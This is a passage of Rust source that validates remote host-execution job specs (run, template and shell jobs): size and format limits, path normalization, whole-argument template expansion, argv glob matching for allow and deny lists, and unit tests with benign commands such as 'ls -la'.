//! What a host job is, shared by the broker (which proposes one) and hostd
//! (which decides whether to run it): the spec, its limits, templates and
//! argv patterns. Spec daemons-hostd §6 (`daemon_common/hostexec.py`).
//!
//! A spec is plain JSON ([`JobSpec::to_json`] gives the exact key set the
//! digest is computed over):
//!
//! ```text
//! {"kind": "run" | "tpl", "host", "tier": "user" | "root",
//!  "argv": [...]                          (run)
//!  "template": "<name>", "params": {...}  (tpl; the host expands its own)
//!  "cwd": "/abs" | null, "env": {...}, "timeout": <secs>, "stdin": "..." | null}
//! {"kind": "shell", "host", "tier", "duration": <secs>}
//! ```
//!
//! Validation happens once, in the constructors; a value of these types is
//! always a valid spec.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use serde::{Deserialize, Deserializer};
use serde_json::{Map, Value, json};

use crate::authority::{HostexecAuthority, Tier};
use crate::glob::fnmatch;
use crate::names::{EnvKey, TemplateName};
use crate::pyfmt::{escape_unprintable, json_str_map, repr, shlex_join};

pub const MAX_ARGS: usize = 256;
pub const MAX_ARG_BYTES: usize = 16 * 1024;
pub const MAX_ARGV_BYTES: usize = 64 * 1024;
pub const MAX_STDIN_BYTES: usize = 64 * 1024;
pub const MAX_ENV_VARS: usize = 32;
pub const MAX_OUTPUT_BYTES: usize = 1024 * 1024;
pub const OUTPUT_CHUNK_BYTES: usize = 96 * 1024;
pub const DEFAULT_TIMEOUT_SECS: u32 = 600;
pub const MAX_TIMEOUT_SECS: u32 = 24 * 3600;
/// Longest env value, template parameter value and cwd, in characters.
pub const MAX_VALUE_CHARS: usize = 4096;
/// Longest template parameter regex, in characters.
pub const MAX_PATTERN_CHARS: usize = 4096;

/// A spec that does not validate. The text is the Python's.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[error("{0}")]
pub struct SpecError(pub String);

fn err<T>(msg: impl Into<String>) -> Result<T, SpecError> {
    Err(SpecError(msg.into()))
}

/// What a run/tpl job runs.
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum Command {
    Run {
        argv: Vec<String>,
    },
    Template {
        template: TemplateName,
        /// Sorted by name.
        params: BTreeMap<String, String>,
    },
}

/// A validated run/tpl spec (`make_spec`).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct CommandSpec {
    host: String,
    tier: Tier,
    command: Command,
    /// POSIX-normalized absolute path.
    cwd: Option<String>,
    env: BTreeMap<EnvKey, String>,
    timeout: u32,
    stdin: Option<String>,
}

/// What opening a shell is approved for: a tier on a host, for so long
/// (`shell_spec`).
#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub struct ShellSpec {
    host: String,
    tier: Tier,
    duration: u32,
}

#[derive(Debug, Clone, PartialEq, Eq, Hash)]
pub enum JobSpec {
    Command(CommandSpec),
    Shell(ShellSpec),
}

/// The pieces of a run/tpl spec as they arrive (JSON values; absent and
/// `null` are the same). Mirrors `make_spec`'s keyword arguments.
#[derive(Debug, Clone, Copy, Default)]
pub struct SpecFields<'a> {
    pub kind: &'a str,
    pub host: &'a str,
    pub tier: Option<&'a Value>,
    pub argv: Option<&'a Value>,
    pub template: Option<&'a Value>,
    pub params: Option<&'a Value>,
    pub cwd: Option<&'a Value>,
    pub env: Option<&'a Value>,
    pub timeout: Option<&'a Value>,
    pub stdin: Option<&'a Value>,
}

fn present(v: Option<&Value>) -> Option<&Value> {
    v.filter(|v| !v.is_null())
}

fn tier(v: Option<&Value>) -> Result<Tier, SpecError> {
    present(v)
        .and_then(Value::as_str)
        .and_then(Tier::parse)
        .ok_or_else(|| SpecError("tier must be \"user\" or \"root\"".to_owned()))
}

/// `validate_argv`.
pub fn validate_argv(argv: Option<&Value>) -> Result<Vec<String>, SpecError> {
    let Some(Value::Array(items)) = present(argv) else {
        return err("argv must be a non-empty list of strings");
    };
    if items.is_empty() {
        return err("argv must be a non-empty list of strings");
    }
    if items.len() > MAX_ARGS {
        return err(format!("argv has more than {MAX_ARGS} arguments"));
    }
    let mut total = 0usize;
    let mut out = Vec::with_capacity(items.len());
    for item in items {
        let Some(arg) = item.as_str().filter(|a| !a.contains('\0')) else {
            return err("argv must be a list of strings without NUL bytes");
        };
        if arg.len() > MAX_ARG_BYTES {
            return err("an argument is too long");
        }
        total = total.saturating_add(arg.len());
        out.push(arg.to_owned());
    }
    if total > MAX_ARGV_BYTES {
        return err("argv is too long");
    }
    if out.first().is_none_or(String::is_empty) {
        return err("argv[0] is empty");
    }
    Ok(out)
}

/// `validate_cwd`: absent or `""` is none; else an absolute path without
/// NUL of at most 4096 characters, normalized.
pub fn validate_cwd(cwd: Option<&Value>) -> Result<Option<String>, SpecError> {
    match present(cwd) {
        None => Ok(None),
        Some(Value::String(s)) if s.is_empty() => Ok(None),
        Some(Value::String(s))
            if s.starts_with('/') && !s.contains('\0') && s.chars().count() <= MAX_VALUE_CHARS =>
        {
            Ok(Some(posix_normpath(s)))
        }
        Some(_) => err("cwd must be an absolute path"),
    }
}

/// `os.path.normpath` on POSIX: drops `.` and empty components, resolves
/// `..` lexically (never above the root), keeps exactly two leading slashes
/// as two.
#[must_use]
pub fn posix_normpath(path: &str) -> String {
    if path.is_empty() {
        return ".".to_owned();
    }
    let initial = if path.starts_with("//") && !path.starts_with("///") {
        2
    } else if path.starts_with('/') {
        1
    } else {
        0
    };
    let mut comps: Vec<&str> = Vec::new();
    for comp in path.split('/') {
        if comp.is_empty() || comp == "." {
            continue;
        }
        let keep =
            comp != ".." || (initial == 0 && comps.is_empty()) || comps.last() == Some(&"..");
        if keep {
            comps.push(comp);
        } else if !comps.is_empty() {
            comps.pop();
        }
    }
    let joined = comps.join("/");
    let out = format!("{}{joined}", "/".repeat(initial));
    if out.is_empty() { ".".to_owned() } else { out }
}

/// `validate_env`.
pub fn validate_env(env: Option<&Value>) -> Result<BTreeMap<EnvKey, String>, SpecError> {
    let Some(env) = present(env) else {
        return Ok(BTreeMap::new());
    };
    let Value::Object(map) = env else {
        return err(format!(
            "env must be an object of at most {MAX_ENV_VARS} variables"
        ));
    };
    if map.len() > MAX_ENV_VARS {
        return err(format!(
            "env must be an object of at most {MAX_ENV_VARS} variables"
        ));
    }
    let mut out = BTreeMap::new();
    for (key, value) in map {
        let key = EnvKey::parse(key).map_err(|e| SpecError(e.0))?;
        let Some(value) = value.as_str().filter(|v| {
            !v.contains('\0') && !v.contains('\n') && v.chars().count() <= MAX_VALUE_CHARS
        }) else {
            return err(format!("invalid value for environment variable {key}"));
        };
        out.insert(key, value.to_owned());
    }
    Ok(out)
}

/// `validate_timeout`: absent is `default`; else an integer (not a boolean)
/// from 1 to 86400.
pub fn validate_timeout(timeout: Option<&Value>, default: u32) -> Result<u32, SpecError> {
    let Some(timeout) = present(timeout) else {
        return Ok(default);
    };
    timeout
        .as_u64()
        .and_then(|t| u32::try_from(t).ok())
        .filter(|t| (1..=MAX_TIMEOUT_SECS).contains(t))
        .ok_or_else(|| {
            SpecError("timeout must be a number of seconds between 1 and 86400".to_owned())
        })
}

/// `validate_stdin`.
pub fn validate_stdin(stdin: Option<&Value>) -> Result<Option<String>, SpecError> {
    match present(stdin) {
        None => Ok(None),
        Some(Value::String(s)) if s.len() <= MAX_STDIN_BYTES => Ok(Some(s.clone())),
        Some(_) => err(format!(
            "stdin must be text of at most {MAX_STDIN_BYTES} bytes"
        )),
    }
}

fn template_params(params: Option<&Value>) -> Result<BTreeMap<String, String>, SpecError> {
    let bad = || SpecError("template params must be an object of strings".to_owned());
    let Some(Value::Object(map)) = present(params) else {
        return Err(bad());
    };
    map.iter()
        .map(|(k, v)| {
            v.as_str()
                .filter(|v| !v.contains('\0') && v.chars().count() <= MAX_VALUE_CHARS)
                .map(|v| (k.clone(), v.to_owned()))
                .ok_or_else(bad)
        })
        .collect()
}

/// `make_spec`: validate the pieces of a run/tpl job, in the Python's order
/// (kind, tier, template+params or argv, cwd, env, timeout, stdin).
pub fn make_spec(fields: &SpecFields<'_>) -> Result<CommandSpec, SpecError> {
    make_spec_with_default(fields, DEFAULT_TIMEOUT_SECS)
}

/// [`make_spec`] with hostd's default timeout for an absent one.
pub fn make_spec_with_default(
    fields: &SpecFields<'_>,
    default_timeout: u32,
) -> Result<CommandSpec, SpecError> {
    match fields.kind {
        "run" | "tpl" => {}
        // The Python accepted kind "shell" here, but nothing used it: a
        // shell is a ShellSpec, and shell commands are "run" specs.
        _ => return err("kind must be one of run, tpl, shell"),
    }
    let tier = tier(fields.tier)?;
    let command = if fields.kind == "tpl" {
        let template = present(fields.template)
            .and_then(Value::as_str)
            .and_then(|t| TemplateName::parse(t).ok())
            .ok_or_else(|| SpecError("invalid template name".to_owned()))?;
        Command::Template {
            template,
            params: template_params(fields.params)?,
        }
    } else {
        Command::Run {
            argv: validate_argv(fields.argv)?,
        }
    };
    Ok(CommandSpec {
        host: fields.host.to_owned(),
        tier,
        command,
        cwd: validate_cwd(fields.cwd)?,
        env: validate_env(fields.env)?,
        timeout: validate_timeout(fields.timeout, default_timeout)?,
        stdin: validate_stdin(fields.stdin)?,
    })
}

/// `job_spec(capability, host, scope)` (`core/hostexec.py`): the canonical
/// spec of a run/tpl request, from its wire capability and scope.
pub fn job_spec(
    capability: &str,
    host: &str,
    scope: &Map<String, Value>,
) -> Result<CommandSpec, SpecError> {
    let empty = Value::Object(Map::new());
    let common = |kind| SpecFields {
        kind,
        host,
        tier: scope.get("tier"),
        cwd: scope.get("cwd"),
        env: scope.get("env"),
        timeout: scope.get("timeout"),
        stdin: scope.get("stdin"),
        ..SpecFields::default()
    };
    if let Some(template) = capability.strip_prefix("tpl.") {
        let template = Value::String(template.to_owned());
        // `scope.get("params") or {}`
        let params = scope
            .get("params")
            .filter(|p| !is_falsy(p))
            .unwrap_or(&empty);
        make_spec(&SpecFields {
            template: Some(&template),
            params: Some(params),
            ..common("tpl")
        })
    } else {
        make_spec(&SpecFields {
            argv: scope.get("argv"),
            ..common("run")
        })
    }
}

/// Python truthiness of a JSON value.
fn is_falsy(v: &Value) -> bool {
    match v {
        Value::Null => true,
        Value::Bool(b) => !b,
        Value::Number(n) => {
            n.as_u64() == Some(0)
                || n.as_i64() == Some(0)
                || n.as_f64()
                    .is_some_and(|f| f.classify() == std::num::FpCategory::Zero)
        }
        Value::String(s) => s.is_empty(),
        Value::Array(a) => a.is_empty(),
        Value::Object(o) => o.is_empty(),
    }
}

/// `shell_spec(host, tier, duration)`.
pub fn shell_spec(
    host: &str,
    tier: Option<&Value>,
    duration_secs: Option<&Value>,
) -> Result<ShellSpec, SpecError> {
    let tier = self::tier(tier)?;
    let duration = present(duration_secs)
        .and_then(Value::as_u64)
        .filter(|d| *d > 0)
        .and_then(|d| u32::try_from(d).ok())
        .ok_or_else(|| SpecError("a shell needs a duration in seconds".to_owned()))?;
    Ok(ShellSpec {
        host: host.to_owned(),
        tier,
        duration,
    })
}

impl ShellSpec {
    /// A shell spec from typed parts.
    pub fn new(host: &str, tier: Tier, duration_secs: u32) -> Result<ShellSpec, SpecError> {
        if duration_secs == 0 {
            return err("a shell needs a duration in seconds");
        }
        Ok(ShellSpec {
            host: host.to_owned(),
            tier,
            duration: duration_secs,
        })
    }

    #[must_use]
    pub fn host(&self) -> &str {
        &self.host
    }

    #[must_use]
    pub fn tier(&self) -> Tier {
        self.tier
    }

    #[must_use]
    pub fn duration(&self) -> u32 {
        self.duration
    }

    #[must_use]
    pub fn to_json(&self) -> Value {
        json!({"kind": "shell", "host": self.host, "tier": self.tier.as_str(), "duration": self.duration})
    }
}

impl CommandSpec {
    /// The spec of a hostexec run/tpl authority on `host`.
    pub fn from_authority(
        host: &str,
        authority: &HostexecAuthority,
    ) -> Result<CommandSpec, SpecError> {
        match authority {
            HostexecAuthority::Run { argv, options } => {
                let argv = json!(argv);
                let env = json!(options.env);
                let tier = json!(options.tier.as_str());
                let timeout = options.timeout.map(|t| json!(t));
                let cwd = options.cwd.as_ref().map(|c| json!(c));
                let stdin = options.stdin.as_ref().map(|s| json!(s));
                make_spec(&SpecFields {
                    kind: "run",
                    host,
                    tier: Some(&tier),
                    argv: Some(&argv),
                    cwd: cwd.as_ref(),
                    env: Some(&env),
                    timeout: timeout.as_ref(),
                    stdin: stdin.as_ref(),
                    ..SpecFields::default()
                })
            }
            HostexecAuthority::Template {
                template,
                params,
                options,
            } => {
                let template = json!(template);
                let params = json!(params);
                let env = json!(options.env);
                let tier = json!(options.tier.as_str());
                let timeout = options.timeout.map(|t| json!(t));
                let cwd = options.cwd.as_ref().map(|c| json!(c));
                let stdin = options.stdin.as_ref().map(|s| json!(s));
                make_spec(&SpecFields {
                    kind: "tpl",
                    host,
                    tier: Some(&tier),
                    template: Some(&template),
                    params: Some(&params),
                    cwd: cwd.as_ref(),
                    env: Some(&env),
                    timeout: timeout.as_ref(),
                    stdin: stdin.as_ref(),
                    ..SpecFields::default()
                })
            }
            HostexecAuthority::Shell { .. } | HostexecAuthority::Window { .. } => {
                err("not a runnable job")
            }
        }
    }

    #[must_use]
    pub fn host(&self) -> &str {
        &self.host
    }

    #[must_use]
    pub fn tier(&self) -> Tier {
        self.tier
    }

    #[must_use]
    pub fn command(&self) -> &Command {
        &self.command
    }

    #[must_use]
    pub fn cwd(&self) -> Option<&str> {
        self.cwd.as_deref()
    }

    #[must_use]
    pub fn env(&self) -> &BTreeMap<EnvKey, String> {
        &self.env
    }

    #[must_use]
    pub fn timeout(&self) -> u32 {
        self.timeout
    }

    #[must_use]
    pub fn stdin(&self) -> Option<&str> {
        self.stdin.as_deref()
    }

    #[must_use]
    pub fn kind(&self) -> &'static str {
        match self.command {
            Command::Run { .. } => "run",
            Command::Template { .. } => "tpl",
        }
    }

    /// The canonical JSON, with the Python's exact key set.
    #[must_use]
    pub fn to_json(&self) -> Value {
        let mut map = Map::new();
        map.insert("kind".to_owned(), json!(self.kind()));
        map.insert("host".to_owned(), json!(self.host));
        map.insert("tier".to_owned(), json!(self.tier.as_str()));
        match &self.command {
            Command::Run { argv } => {
                map.insert("argv".to_owned(), json!(argv));
            }
            Command::Template { template, params } => {
                map.insert("template".to_owned(), json!(template.as_str()));
                map.insert("params".to_owned(), json!(params));
            }
        }
        map.insert("cwd".to_owned(), json!(self.cwd));
        let env: Map<String, Value> = self
            .env
            .iter()
            .map(|(k, v)| (k.as_str().to_owned(), json!(v)))
            .collect();
        map.insert("env".to_owned(), Value::Object(env));
        map.insert("timeout".to_owned(), json!(self.timeout));
        map.insert("stdin".to_owned(), json!(self.stdin));
        Value::Object(map)
    }
}

impl JobSpec {
    /// Parse a raw spec as a peer sent it (hostd's `_normalize` input).
    /// Unknown keys, and keys of the other kind (`argv` on a template job),
    /// are refused. An absent or zero `timeout` takes `default_timeout`
    /// (hostd's `raw.get("timeout") or default`).
    pub fn from_json(raw: &Value, default_timeout: u32) -> Result<JobSpec, SpecError> {
        let Value::Object(map) = raw else {
            return err("malformed job");
        };
        let kind = map.get("kind").and_then(Value::as_str).unwrap_or("");
        let allowed: &[&str] = match kind {
            "shell" => &["kind", "host", "tier", "duration"],
            "run" => &[
                "kind", "host", "tier", "argv", "cwd", "env", "timeout", "stdin",
            ],
            "tpl" => &[
                "kind", "host", "tier", "template", "params", "cwd", "env", "timeout", "stdin",
            ],
            _ => return err("kind must be one of run, tpl, shell"),
        };
        let unknown: BTreeSet<&str> = map
            .keys()
            .map(String::as_str)
            .filter(|k| !allowed.contains(k))
            .collect();
        if !unknown.is_empty() {
            return err(format!(
                "malformed job: unexpected keys {}",
                unknown.into_iter().collect::<Vec<_>>().join(", ")
            ));
        }
        let Some(host) = map.get("host").and_then(Value::as_str) else {
            return err("malformed job: no host");
        };
        if kind == "shell" {
            return shell_spec(host, map.get("tier"), map.get("duration")).map(JobSpec::Shell);
        }
        let timeout = map.get("timeout").filter(|t| !is_falsy(t));
        make_spec_with_default(
            &SpecFields {
                kind,
                host,
                tier: map.get("tier"),
                argv: map.get("argv"),
                template: map.get("template"),
                params: map.get("params"),
                cwd: map.get("cwd"),
                env: map.get("env"),
                timeout,
                stdin: map.get("stdin"),
            },
            default_timeout,
        )
        .map(JobSpec::Command)
    }

    #[must_use]
    pub fn to_json(&self) -> Value {
        match self {
            JobSpec::Command(c) => c.to_json(),
            JobSpec::Shell(s) => s.to_json(),
        }
    }

    #[must_use]
    pub fn host(&self) -> &str {
        match self {
            JobSpec::Command(c) => c.host(),
            JobSpec::Shell(s) => s.host(),
        }
    }

    #[must_use]
    pub fn tier(&self) -> Tier {
        match self {
            JobSpec::Command(c) => c.tier(),
            JobSpec::Shell(s) => s.tier(),
        }
    }

    /// `describe(spec)`: one line for logs and prompts,
    /// `[root@excelsior] systemctl restart nginx`.
    #[must_use]
    pub fn describe(&self) -> String {
        let what = match self {
            JobSpec::Command(c) => match &c.command {
                Command::Template { template, params } => format!(
                    "template {template} {}",
                    json_str_map(params.iter().map(|(k, v)| (k.as_str(), v.as_str())))
                ),
                Command::Run { argv } => shlex_join(argv),
            },
            JobSpec::Shell(_) => "shell".to_owned(),
        };
        format!(
            "[{}@{}] {what}",
            self.tier(),
            escape_unprintable(self.host())
        )
    }
}

impl fmt::Display for JobSpec {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(&self.describe())
    }
}

/// A template parameter's pattern: a regex its value must match in full
/// (Python `re.fullmatch`). Rust's `regex` dialect: no backreferences or
/// lookaround (refused when compiled); matching is linear-time.
#[derive(Clone)]
pub struct ParamPattern {
    source: String,
    full: regex::Regex,
}

impl ParamPattern {
    pub fn new(pattern: &str) -> Result<ParamPattern, SpecError> {
        if pattern.chars().count() > MAX_PATTERN_CHARS {
            return err(format!(
                "a parameter pattern is longer than {MAX_PATTERN_CHARS} characters"
            ));
        }
        let build = |p: &str| {
            regex::RegexBuilder::new(p)
                .size_limit(1 << 20)
                .dfa_size_limit(1 << 20)
                .nest_limit(64)
                .build()
                .map_err(|e| SpecError(format!("invalid parameter pattern {}: {e}", repr(pattern))))
        };
        // Compiled alone first: only a pattern that stands on its own (its
        // groups balanced) may be wrapped, or "a)|(b" would become an
        // alternation of the wrapper.
        build(pattern)?;
        let full = build(&format!(r"\A(?:{pattern})\z"))?;
        Ok(ParamPattern {
            source: pattern.to_owned(),
            full,
        })
    }

    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.source
    }

    #[must_use]
    pub fn full_match(&self, value: &str) -> bool {
        self.full.is_match(value)
    }
}

impl fmt::Debug for ParamPattern {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "ParamPattern({:?})", self.source)
    }
}

impl PartialEq for ParamPattern {
    fn eq(&self, other: &Self) -> bool {
        self.source == other.source
    }
}
impl Eq for ParamPattern {}

impl<'de> Deserialize<'de> for ParamPattern {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        let s = String::deserialize(d)?;
        ParamPattern::new(&s).map_err(serde::de::Error::custom)
    }
}

/// A host template: `{"tier", "argv": [... {name} placeholders], "params":
/// {name: regex}, "description"}`. The policy file mirrors the hosts' for
/// display; what runs is the host's own copy.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Template {
    pub tier: Tier,
    /// Non-empty.
    argv: Vec<String>,
    pub params: BTreeMap<String, ParamPattern>,
    pub description: String,
}

impl Template {
    pub fn new(
        tier: Tier,
        argv: Vec<String>,
        params: BTreeMap<String, ParamPattern>,
        description: String,
    ) -> Result<Template, SpecError> {
        if argv.is_empty() {
            return err("argv: a template needs at least one argument");
        }
        Ok(Template {
            tier,
            argv,
            params,
            description,
        })
    }

    #[must_use]
    pub fn argv(&self) -> &[String] {
        &self.argv
    }

    /// `expand_template`: the argv with `{name}` placeholders filled from
    /// `params`, each checked against its pattern. Whole-argument
    /// substitution only: a parameter can never add or split arguments, and
    /// nothing goes through a shell. One pass; substituted text is not
    /// expanded again.
    pub fn expand(&self, params: &BTreeMap<String, String>) -> Result<Vec<String>, SpecError> {
        let given: BTreeSet<&str> = params.keys().map(String::as_str).collect();
        let wanted: BTreeSet<&str> = self.params.keys().map(String::as_str).collect();
        if given != wanted {
            let names: Vec<&str> = wanted.into_iter().collect();
            let names = if names.is_empty() {
                "(none)".to_owned()
            } else {
                names.join(", ")
            };
            return err(format!("template takes exactly these parameters: {names}"));
        }
        for (name, value) in params {
            let ok = self.params.get(name).is_some_and(|p| p.full_match(value));
            if !ok {
                return err(format!(
                    "parameter {} does not match the template's pattern",
                    repr(name)
                ));
            }
        }
        Ok(self.argv.iter().map(|arg| fill(arg, params)).collect())
    }
}

/// Replace each `{name}` (`[a-z0-9_]+`) that names a parameter.
fn fill(arg: &str, params: &BTreeMap<String, String>) -> String {
    let mut out = String::with_capacity(arg.len());
    let mut rest = arg;
    while let Some(open) = rest.find('{') {
        let (before, from_brace) = rest.split_at(open);
        out.push_str(before);
        let after = from_brace.get(1..).unwrap_or("");
        let name_len = after
            .bytes()
            .take_while(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || *b == b'_')
            .count();
        let name = after.get(..name_len).unwrap_or("");
        let closes = after.get(name_len..name_len.saturating_add(1)) == Some("}");
        if name_len > 0 && closes {
            match params.get(name) {
                Some(value) => out.push_str(value),
                None => {
                    out.push('{');
                    out.push_str(name);
                    out.push('}');
                }
            }
            rest = after.get(name_len.saturating_add(1)..).unwrap_or("");
        } else {
            out.push('{');
            rest = after;
        }
    }
    out.push_str(rest);
    out
}

#[derive(Deserialize)]
#[serde(deny_unknown_fields)]
struct RawTemplate {
    tier: String,
    argv: Vec<String>,
    #[serde(default)]
    params: BTreeMap<String, ParamPattern>,
    #[serde(default)]
    description: String,
}

impl<'de> Deserialize<'de> for Template {
    fn deserialize<D: Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
        let raw = RawTemplate::deserialize(d)?;
        let tier = Tier::parse(&raw.tier)
            .ok_or_else(|| serde::de::Error::custom("tier must be \"user\" or \"root\""))?;
        Template::new(tier, raw.argv, raw.params, raw.description).map_err(serde::de::Error::custom)
    }
}

/// `match_argv(pattern, argv, loose_program)`: each pattern element is a
/// glob for one argument; a final `"**"` stands for any number of further
/// arguments (none included). With `loose_program` the first element also
/// matches the program's basename (deny lists use it, so denying `rm`
/// covers `/run/current-system/sw/bin/rm`).
#[must_use]
pub fn match_argv<P: AsRef<str>, A: AsRef<str>>(
    pattern: &[P],
    argv: &[A],
    loose_program: bool,
) -> bool {
    let rest = pattern.last().is_some_and(|p| p.as_ref() == "**");
    let fixed = if rest {
        pattern
            .get(..pattern.len().saturating_sub(1))
            .unwrap_or(&[])
    } else {
        pattern
    };
    if argv.len() < fixed.len() || (!rest && argv.len() != fixed.len()) {
        return false;
    }
    fixed.iter().zip(argv).enumerate().all(|(i, (glob, arg))| {
        let (glob, arg) = (glob.as_ref(), arg.as_ref());
        fnmatch(arg, glob) || (i == 0 && loose_program && fnmatch(basename(arg), glob))
    })
}

fn basename(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn run(argv: Value) -> Result<CommandSpec, String> {
        make_spec(&SpecFields {
            kind: "run",
            host: "h",
            tier: Some(&json!("user")),
            argv: Some(&argv),
            ..SpecFields::default()
        })
        .map_err(|e| e.0)
    }

    #[test]
    fn spec_validation_normalizes() {
        let spec = make_spec(&SpecFields {
            kind: "run",
            host: "excelsior",
            tier: Some(&json!("root")),
            argv: Some(&json!(["ls", "-la"])),
            cwd: Some(&json!("/tmp//a/./b/../c/")),
            env: Some(&json!({"Z": "1", "A": "2"})),
            ..SpecFields::default()
        })
        .unwrap();
        assert_eq!(
            spec.to_json(),
            json!({"kind": "run", "host": "excelsior", "tier": "root", "argv": ["ls", "-la"],
                   "cwd": "/tmp/a/c", "env": {"A": "2", "Z": "1"}, "timeout": 600, "stdin": null})
        );
        assert_eq!(spec.to_json().as_object().unwrap().len(), 8);
        assert_eq!(
            JobSpec::Command(spec.clone()).describe(),
            "[root@excelsior] ls -la"
        );
        // A raw spec round-trips through JSON to the same spec.
        let again = JobSpec::from_json(&spec.to_json(), 600).unwrap();
        assert_eq!(again, JobSpec::Command(spec));
    }

    #[test]
    fn spec_errors() {
        assert_eq!(
            run(json!([])).unwrap_err(),
            "argv must be a non-empty list of strings"
        );
        assert_eq!(
            run(json!("ls")).unwrap_err(),
            "argv must be a non-empty list of strings"
        );
        assert_eq!(
            run(json!(["a\0"])).unwrap_err(),
            "argv must be a list of strings without NUL bytes"
        );
        assert_eq!(
            run(json!([1])).unwrap_err(),
            "argv must be a list of strings without NUL bytes"
        );
        assert_eq!(run(json!([""])).unwrap_err(), "argv[0] is empty");
        assert_eq!(
            run(json!(vec!["a"; 257])).unwrap_err(),
            "argv has more than 256 arguments"
        );
        assert_eq!(
            run(json!(["a".repeat(16 * 1024 + 1)])).unwrap_err(),
            "an argument is too long"
        );
        assert_eq!(
            run(json!(vec!["a".repeat(16 * 1024); 5])).unwrap_err(),
            "argv is too long"
        );
        let bad_tier = make_spec(&SpecFields {
            kind: "run",
            host: "h",
            tier: Some(&json!("admin")),
            argv: Some(&json!(["ls"])),
            ..SpecFields::default()
        });
        assert_eq!(bad_tier.unwrap_err().0, "tier must be \"user\" or \"root\"");
        let k = make_spec(&SpecFields {
            kind: "exec",
            ..SpecFields::default()
        });
        assert_eq!(k.unwrap_err().0, "kind must be one of run, tpl, shell");
        let base = SpecFields {
            kind: "run",
            host: "h",
            tier: Some(&Value::Null),
            ..SpecFields::default()
        };
        let user = json!("user");
        let argv = json!(["ls"]);
        let base = SpecFields {
            tier: Some(&user),
            argv: Some(&argv),
            ..base
        };
        let with = |f: SpecFields<'_>| make_spec(&f).map_err(|e| e.0);
        assert_eq!(
            with(SpecFields {
                cwd: Some(&json!("rel")),
                ..base
            })
            .unwrap_err(),
            "cwd must be an absolute path"
        );
        assert_eq!(
            with(SpecFields {
                cwd: Some(&json!("")),
                ..base
            })
            .unwrap()
            .cwd(),
            None
        );
        assert_eq!(
            with(SpecFields {
                env: Some(&json!({"1A": "x"})),
                ..base
            })
            .unwrap_err(),
            "invalid environment variable name '1A'"
        );
        assert_eq!(
            with(SpecFields {
                env: Some(&json!({"A": "x\ny"})),
                ..base
            })
            .unwrap_err(),
            "invalid value for environment variable A"
        );
        assert_eq!(
            with(SpecFields {
                env: Some(&json!([1])),
                ..base
            })
            .unwrap_err(),
            "env must be an object of at most 32 variables"
        );
        for t in [json!(0), json!(86401), json!(true), json!(1.5), json!("60")] {
            assert_eq!(
                with(SpecFields {
                    timeout: Some(&t),
                    ..base
                })
                .unwrap_err(),
                "timeout must be a number of seconds between 1 and 86400"
            );
        }
        assert_eq!(
            with(SpecFields {
                timeout: Some(&json!(86400)),
                ..base
            })
            .unwrap()
            .timeout(),
            86400
        );
        assert_eq!(
            with(SpecFields {
                stdin: Some(&json!("x".repeat(65537))),
                ..base
            })
            .unwrap_err(),
            "stdin must be text of at most 65536 bytes"
        );
    }

    #[test]
    fn template_specs() {
        let spec = job_spec(
            "tpl.restart",
            "excelsior",
            json!({"tier": "user", "params": {"unit": "nginx"}})
                .as_object()
                .unwrap(),
        )
        .unwrap();
        assert_eq!(
            spec.to_json(),
            json!({"kind": "tpl", "host": "excelsior", "tier": "user", "template": "restart",
                   "params": {"unit": "nginx"}, "cwd": null, "env": {}, "timeout": 600, "stdin": null})
        );
        assert_eq!(
            JobSpec::Command(spec).describe(),
            "[user@excelsior] template restart {\"unit\": \"nginx\"}"
        );
        let bad = job_spec("tpl.Bad", "h", json!({"tier": "user"}).as_object().unwrap());
        assert_eq!(bad.unwrap_err().0, "invalid template name");
        let bad = job_spec(
            "tpl.x",
            "h",
            json!({"tier": "user", "params": {"a": 1}})
                .as_object()
                .unwrap(),
        );
        assert_eq!(
            bad.unwrap_err().0,
            "template params must be an object of strings"
        );
        // "params" absent is {} on the broker side.
        assert!(job_spec("tpl.x", "h", json!({"tier": "user"}).as_object().unwrap()).is_ok());
    }

    #[test]
    fn shells() {
        let s = shell_spec("h", Some(&json!("root")), Some(&json!(1800))).unwrap();
        assert_eq!(
            s.to_json(),
            json!({"kind": "shell", "host": "h", "tier": "root", "duration": 1800})
        );
        assert_eq!(JobSpec::Shell(s).describe(), "[root@h] shell");
        for d in [json!(0), json!(-1), json!(true), json!("60"), Value::Null] {
            assert_eq!(
                shell_spec("h", Some(&json!("user")), Some(&d))
                    .unwrap_err()
                    .0,
                "a shell needs a duration in seconds"
            );
        }
    }

    #[test]
    fn from_json_is_strict() {
        let raw = json!({"kind": "run", "host": "h", "tier": "user", "argv": ["ls"], "extra": 1});
        assert!(JobSpec::from_json(&raw, 600).is_err());
        let raw = json!({"kind": "tpl", "host": "h", "tier": "user", "template": "t", "params": {}, "argv": ["x"]});
        assert!(JobSpec::from_json(&raw, 600).is_err());
        let raw = json!({"kind": "run", "host": "h", "tier": "user", "argv": ["ls"], "timeout": 0});
        assert_eq!(
            JobSpec::from_json(&raw, 300).unwrap().to_json()["timeout"],
            json!(300)
        );
        assert!(JobSpec::from_json(&json!([1]), 600).is_err());
        assert!(
            JobSpec::from_json(&json!({"kind": "run", "tier": "user", "argv": ["ls"]}), 600)
                .is_err()
        );
    }

    #[test]
    fn from_authority_matches_job_spec() {
        let scope = json!({"tier": "root", "argv": ["systemctl", "restart", "x"], "timeout": 60});
        let auth = crate::authority::Authority::from_wire(
            crate::platform::Platform::Hostexec,
            "run",
            scope.as_object().unwrap(),
        )
        .unwrap();
        let crate::authority::Authority::Hostexec(h) = &auth else {
            panic!("not hostexec")
        };
        let a = CommandSpec::from_authority("excelsior", h).unwrap();
        let b = job_spec("run", "excelsior", &auth.scope()).unwrap();
        assert_eq!(a, b);
        assert_eq!(a.timeout(), 60);
    }

    #[test]
    fn normpath() {
